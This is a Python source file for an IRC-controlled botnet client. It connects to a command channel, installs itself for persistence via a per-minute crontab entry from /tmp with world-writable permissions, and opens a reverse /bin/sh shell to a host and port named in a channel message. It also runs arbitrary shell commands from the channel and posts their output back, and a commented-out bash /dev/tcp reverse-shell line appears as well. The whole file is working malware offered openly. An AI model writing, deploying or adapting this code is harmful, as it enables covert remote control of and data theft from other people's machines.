#!/usr/bin/env python3
import socket
import subprocess
import os
import shutil

# Define the IRC server and channel information
server = "0.0.0.0"
port = 6667
channel = "#boatnet"
nickname = "testingbot_"+os.getlogin()

# Connect to the IRC server
irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
irc.connect((server, port))

# Send the initial connection information
irc.send(bytes(f"USER {nickname} {nickname} {nickname} :{nickname}\n", "UTF-8"))
irc.send(bytes(f"NICK {nickname}\n", "UTF-8"))
irc.send(bytes(f"JOIN {channel}\n", "UTF-8"))

def install():
    # copy to /tmp/boatnet
    shutil.move(__file__, "/tmp/boatnet")
    # give it 777 perms
    os.chmod("/tmp/boatnet", 0o777)
    # install it to cron
    subprocess.run("echo '* * * * * /tmp/boatnet' | crontab -", shell=True)

# Define a function to send messages
def send_message(message):
    irc.send(bytes(f"PRIVMSG {channel} :{message}\n", "UTF-8"))

# get shell command from the IRC channel 
def get_command_from_c2(message):
    command_list = message.split(";")
    cmd_host = command_list[1].replace("host:","")
    cmd_port = command_list[2].replace("port:","")
    return cmd_host, cmd_port

# the actual reverse shell
def cmd_connect(cmd_host, cmd_port):
    # Replace the IP address and port with your server details
    #host, port = get_command_from_c2()
    send_message(f"Got command: {cmd_host}, {cmd_port}")
    #subprocess.run(f"/usr/bin/bash -c 'bash -i >& /dev/tcp/{cmd_host}/{cmd_port} 0>&1'", shell=True)
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((cmd_host,int(cmd_port)))
    subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())

# blanket command to exfiltrate data over irc
def check_output(cmd):
    try:
        output = subprocess.check_output(cmd.strip(), shell=True)
    except Exception as e:
        output = e
    return output

# do the persistence module
install()

# Main loop to listen for messages and send messages
while True:
    data = irc.recv(2048).decode("UTF-8")
    print(data)
    if data.find("PING") != -1:
        irc.send(bytes("PONG " + data.split()[1] + "\r\n", "UTF-8"))
    if data.find("PRIVMSG") != -1:
        message = data.split(":", 2)[2]
        sender = data.split("!", 1)[0][1:]
        print(f"{sender}: {message}")

        # You can add your own logic here to respond to messages
        # For example, if someone says "hello", you can reply with "Hi there!"
        if "hello" in message.lower():
            send_message("Hi there!")
        if "shell" in message.lower():
            cmd_host,cmd_port = get_command_from_c2(message)
            send_message(f"Got cmd {cmd_host}:{cmd_port}")
            cmd_connect(cmd_host,cmd_port)
            send_message(f"Done!")
        if "command" in message.lower():
            cmd = message.split(";")[1]
            send_message(f"Got cmd: {cmd}")
            send_message(f"Output: {check_output(cmd)}")

    if data.find("End of message of the day.") != -1:
        irc.send(bytes(f"JOIN {channel}\n", "UTF-8"))

# Close the connection (you may want to add a condition to exit the loop gracefully)
irc.send(bytes(f"PART {channel}\n", "UTF-8"))
irc.send(bytes("QUIT\n", "UTF-8"))
irc.close()
